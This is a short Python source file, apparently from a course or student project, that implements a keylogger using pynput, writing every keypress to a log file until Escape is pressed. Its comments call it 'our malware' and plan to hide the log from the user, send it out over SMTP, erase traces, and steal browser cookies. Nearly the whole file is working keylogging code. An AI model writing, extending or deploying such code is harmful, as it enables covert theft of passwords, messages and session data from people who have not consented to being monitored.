from pynput import keyboard
import os 

#Notes for next update:
#For now store it in a text file that is visible to the user
#Later on, to hide this so the user is unaware that our malware is creating a text file, we will store it runtime,
#And use SMTP to send it over a network, while removing traces of the log file (Week 6)
#Next week we will get the cookie browser information, maybe somehow store this with our logfile, and then send via SMTP 


logs = open("log.txt", "w")
def on_press(key):
    try:
        #Writes alphanumerical characters to our log file
        logs.write('{0}\n'.format(key.char))
    except AttributeError:
        #Since pynput will throw an attribute error when typing a special key i.e holding shift
        #The exception will catch this and still write to our log file
        logs.write('{0}\n'.format(key))
def on_release(key):
    if key == keyboard.Key.esc:
        logs.close()
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()